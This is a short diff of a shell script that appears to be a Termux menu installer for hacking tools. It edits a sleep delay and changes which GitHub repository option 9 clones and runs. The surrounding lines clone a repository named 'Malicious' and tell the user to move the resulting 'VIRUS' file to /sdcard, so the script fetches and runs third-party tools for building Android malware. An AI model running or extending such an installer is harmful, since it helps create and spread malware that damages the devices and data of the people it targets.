@@ -172,7 +172,7 @@ clear
 echo $me "AFTER DONE,U NEED TO DO cd Android"
 echo $me "AND MOVE IT TO SDCARD USING mv (VIRUS NAME) /sdcard"
 echo $me "xEHx Here.."
-sleep 13
+sleep 10
 pkg install python2
 git clone https://github.com/Mr-xDODOL/Malicious
 cd Malicious
@@ -204,9 +204,9 @@ fi
 if [ $pil = 9 ]
 then
 clear
-git clone https://github.com/4L13199/LITESCRIPT
-cd LITESCRIPT
-python2 LITESCRIPT.py
+git clone https://github.com/ICT154/SDC
+cd SDC
+python2 create.py
 fi
 
 if [ $pil = 10 ]
